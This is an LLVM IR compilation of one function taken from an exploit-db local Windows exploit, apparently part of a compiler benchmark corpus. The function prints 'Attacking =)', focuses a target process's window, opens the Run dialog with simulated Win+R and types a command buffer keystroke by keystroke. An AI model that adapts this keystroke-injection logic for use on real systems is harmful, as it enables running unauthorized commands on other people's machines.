; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_26222.c_ExplorerExecution.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_26222.c_ExplorerExecution.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@pid = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [28 x i8] c"HANDLE Found. Attacking =)\0A\00", align 1
@VK_LWIN = common dso_local global i32 0, align 4
@KEYEVENTF_KEYUP = common dso_local global i32 0, align 4
@buf = common dso_local global i8* null, align 8
@VK_SHIFT = common dso_local global i32 0, align 4
@VK_LMENU = common dso_local global i32 0, align 4
@VK_CONTROL = common dso_local global i32 0, align 4
@VK_RETURN = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @ExplorerExecution(i32 %0, i32 %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  %6 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  store i32 %1, i32* %4, align 4
  %7 = load i32, i32* %3, align 4
  %8 = call i32 @GetWindowThreadProcessId(i32 %7, i64* %5)
  %9 = load i64, i64* %5, align 8
  %10 = load i64, i64* @pid, align 8
  %11 = icmp eq i64 %9, %10
  br i1 %11, label %12, label %112

12:                                               ; preds = %2
  %13 = call i32 @printf(i8* getelementptr inbounds ([28 x i8], [28 x i8]* @.str, i64 0, i64 0))
  %14 = load i32, i32* %3, align 4
  %15 = call i32 @SetForegroundWindow(i32 %14)
  %16 = load i32, i32* @VK_LWIN, align 4
  %17 = call i32 @keybd_event(i32 %16, i32 1, i32 0, i32 0)
  %18 = call i32 @VkKeyScan(i8 signext 114)
  %19 = call i32 @keybd_event(i32 %18, i32 1, i32 0, i32 0)
  %20 = load i32, i32* @VK_LWIN, align 4
  %21 = load i32, i32* @KEYEVENTF_KEYUP, align 4
  %22 = call i32 @keybd_event(i32 %20, i32 1, i32 %21, i32 0)
  %23 = call i32 @VkKeyScan(i8 signext 114)
  %24 = load i32, i32* @KEYEVENTF_KEYUP, align 4
  %25 = call i32 @keybd_event(i32 %23, i32 1, i32 %24, i32 0)
  store i32 0, i32* %6, align 4
  br label %26

26:                                               ; preds = %102, %12
  %27 = load i32, i32* %6, align 4
  %28 = load i8*, i8** @buf, align 8
  %29 = call i32 @strlen(i8* %28)
  %30 = icmp slt i32 %27, %29
  br i1 %30, label %31, label %105

31:                                               ; preds = %26
  %32 = load i8*, i8** @buf, align 8
  %33 = load i32, i32* %6, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds i8, i8* %32, i64 %34
  %36 = load i8, i8* %35, align 1
  %37 = sext i8 %36 to i32
  %38 = icmp eq i32 %37, 58
  br i1 %38, label %39, label %60

39:                                               ; preds = %31
  %40 = load i32, i32* @VK_SHIFT, align 4
  %41 = call i32 @keybd_event(i32 %40, i32 1, i32 0, i32 0)
  %42 = load i8*, i8** @buf, align 8
  %43 = load i32, i32* %6, align 4
  %44 = sext i32 %43 to i64
  %45 = getelementptr inbounds i8, i8* %42, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = call i32 @VkKeyScan(i8 signext %46)
  %48 = call i32 @keybd_event(i32 %47, i32 1, i32 0, i32 0)
  %49 = load i32, i32* @VK_SHIFT, align 4
  %50 = load i32, i32* @KEYEVENTF_KEYUP, align 4
  %51 = call i32 @keybd_event(i32 %49, i32 1, i32 %50, i32 0)
  %52 = load i8*, i8** @buf, align 8
  %53 = load i32, i32* %6, align 4
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %52, i64 %54
  %56 = load i8, i8* %55, align 1
  %57 = call i32 @VkKeyScan(i8 signext %56)
  %58 = load i32, i32* @KEYEVENTF_KEYUP, align 4
  %59 = call i32 @keybd_event(i32 %57, i32 1, i32 %58, i32 0)
  br label %101

60:                                               ; preds = %31
  %61 = load i8*, i8** @buf, align 8
  %62 = load i32, i32* %6, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds i8, i8* %61, i64 %63
  %65 = load i8, i8* %64, align 1
  %66 = sext i8 %65 to i32
  %67 = icmp eq i32 %66, 92
  br i1 %67, label %68, label %84

68:                                               ; preds = %60
  %69 = load i32, i32* @VK_LMENU, align 4
  %70 = call i32 @keybd_event(i32 %69, i32 1, i32 0, i32 0)
  %71 = load i32, i32* @VK_CONTROL, align 4
  %72 = call i32 @keybd_event(i32 %71, i32 1, i32 0, i32 0)
  %73 = call i32 @VkKeyScan(i8 signext 65)
  %74 = call i32 @keybd_event(i32 %73, i32 1, i32 0, i32 0)
  %75 = load i32, i32* @VK_LMENU, align 4
  %76 = load i32, i32* @KEYEVENTF_KEYUP, align 4
  %77 = call i32 @keybd_event(i32 %75, i32 1, i32 %76, i32 0)
  %78 = load i32, i32* @VK_CONTROL, align 4
  %79 = load i32, i32* @KEYEVENTF_KEYUP, align 4
  %80 = call i32 @keybd_event(i32 %78, i32 1, i32 %79, i32 0)
  %81 = call i32 @VkKeyScan(i8 signext 65)
  %82 = load i32, i32* @KEYEVENTF_KEYUP, align 4
  %83 = call i32 @keybd_event(i32 %81, i32 1, i32 %82, i32 0)
  br label %100

84:                                               ; preds = %60
  %85 = load i8*, i8** @buf, align 8
  %86 = load i32, i32* %6, align 4
  %87 = sext i32 %86 to i64
  %88 = getelementptr inbounds i8, i8* %85, i64 %87
  %89 = load i8, i8* %88, align 1
  %90 = call i32 @VkKeyScan(i8 signext %89)
  %91 = call i32 @keybd_event(i32 %90, i32 1, i32 0, i32 0)
  %92 = load i8*, i8** @buf, align 8
  %93 = load i32, i32* %6, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8, i8* %92, i64 %94
  %96 = load i8, i8* %95, align 1
  %97 = call i32 @VkKeyScan(i8 signext %96)
  %98 = load i32, i32* @KEYEVENTF_KEYUP, align 4
  %99 = call i32 @keybd_event(i32 %97, i32 1, i32 %98, i32 0)
  br label %100

100:                                              ; preds = %84, %68
  br label %101

101:                                              ; preds = %100, %39
  br label %102

102:                                              ; preds = %101
  %103 = load i32, i32* %6, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %6, align 4
  br label %26

105:                                              ; preds = %26
  %106 = load i32, i32* @VK_RETURN, align 4
  %107 = call i32 @keybd_event(i32 %106, i32 1, i32 0, i32 0)
  %108 = load i32, i32* @VK_RETURN, align 4
  %109 = load i32, i32* @KEYEVENTF_KEYUP, align 4
  %110 = call i32 @keybd_event(i32 %108, i32 1, i32 %109, i32 0)
  %111 = call i32 @exit(i32 1) #3
  unreachable

112:                                              ; preds = %2
  ret void
}

declare dso_local i32 @GetWindowThreadProcessId(i32, i64*) #1

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @SetForegroundWindow(i32) #1

declare dso_local i32 @keybd_event(i32, i32, i32, i32) #1

declare dso_local i32 @VkKeyScan(i8 signext) #1

declare dso_local i32 @strlen(i8*) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
